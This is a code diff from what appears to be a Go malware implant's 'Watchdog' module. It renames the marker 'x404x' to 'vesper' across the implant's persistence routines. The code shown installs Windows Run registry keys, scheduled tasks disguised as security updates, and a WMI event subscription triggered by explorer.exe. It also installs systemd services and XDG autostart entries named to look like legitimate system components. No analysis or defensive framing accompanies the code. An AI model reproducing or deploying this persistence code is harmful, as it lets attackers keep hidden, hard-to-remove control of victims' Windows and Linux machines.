@@ -53,7 +53,7 @@ func (w *Watchdog) Start(ctx context.Context) error {
 	}
 
 	for i, dir := range backupDirs {
-		backupName := fmt.Sprintf("x404x_wd_%d", time.Now().UnixNano()+int64(i))
+		backupName := fmt.Sprintf("vesper_wd_%d", time.Now().UnixNano()+int64(i))
 		if runtime.GOOS == "windows" {
 			backupName += ".exe"
 		}
@@ -203,9 +203,9 @@ func (w *Watchdog) installRegistryRun() error {
 	backupPath := w.getBackupPath(0)
 
 	cmds := [][]string{
-		{"reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "x404x_wd", "/t", "REG_SZ", "/d", backupPath, "/f"},
-		{"reg", "add", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "x404x_sys", "/t", "REG_SZ", "/d", exePath, "/f"},
-		{"reg", "add", "HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "x404x_sys32", "/t", "REG_SZ", "/d", exePath, "/f"},
+		{"reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "vesper_wd", "/t", "REG_SZ", "/d", backupPath, "/f"},
+		{"reg", "add", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "vesper_sys", "/t", "REG_SZ", "/d", exePath, "/f"},
+		{"reg", "add", "HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "vesper_sys32", "/t", "REG_SZ", "/d", exePath, "/f"},
 	}
 
 	for _, cmd := range cmds {
@@ -221,9 +221,9 @@ func (w *Watchdog) installScheduledTask() error {
 	exePath, _ := os.Executable()
 
 	cmds := [][]string{
-		{"schtasks", "/create", "/tn", "x404x_SecurityUpdate", "/tr", exePath, "/sc", "daily", "/st", fmt.Sprintf("%02d:%02d", rand.Intn(24), rand.Intn(60)), "/f"},
-		{"schtasks", "/create", "/tn", "x404x_SystemCheck", "/tr", exePath, "/sc", "onlogon", "/f"},
-		{"schtasks", "/create", "/tn", "x404x_WinDefUpd", "/tr", exePath, "/sc", "weekly", "/d", "MON", "/f"},
+		{"schtasks", "/create", "/tn", "vesper_SecurityUpdate", "/tr", exePath, "/sc", "daily", "/st", fmt.Sprintf("%02d:%02d", rand.Intn(24), rand.Intn(60)), "/f"},
+		{"schtasks", "/create", "/tn", "vesper_SystemCheck", "/tr", exePath, "/sc", "onlogon", "/f"},
+		{"schtasks", "/create", "/tn", "vesper_WinDefUpd", "/tr", exePath, "/sc", "weekly", "/d", "MON", "/f"},
 	}
 
 	for _, cmd := range cmds {
@@ -242,11 +242,11 @@ func (w *Watchdog) installWMIEventSubscription() error {
 $filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
 $filter.QueryLanguage = "WQL"
 $filter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
-$filter.Name = "x404x_WMI_Filter"
+$filter.Name = "vesper_WMI_Filter"
 $filter.Put()
 
 $consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
-$consumer.Name = "x404x_WMI_Consumer"
+$consumer.Name = "vesper_WMI_Consumer"
 $consumer.CommandLineTemplate = "%s"
 $consumer.Put()
 
@@ -265,7 +265,7 @@ func (w *Watchdog) installSystemdService() error {
 	}
 	exePath, _ := os.Executable()
 
-	serviceNames := []string{"x404x-cored", "system-update-check", "dbus-monitor-d"}
+	serviceNames := []string{"vesper-cored", "system-update-check", "dbus-monitor-d"}
 	for _, svcName := range serviceNames {
 		serviceContent := fmt.Sprintf(`[Unit]
 Description=Core System Service
@@ -355,7 +355,7 @@ func (w *Watchdog) installXDGAutostart() error {
 	os.MkdirAll(autostartDir, 0755)
 
 	desktopEntries := []string{
-		"x404x-system-check.desktop",
+		"vesper-system-check.desktop",
 		"gnome-update-service.desktop",
 		"user-session-init.desktop",
 	}
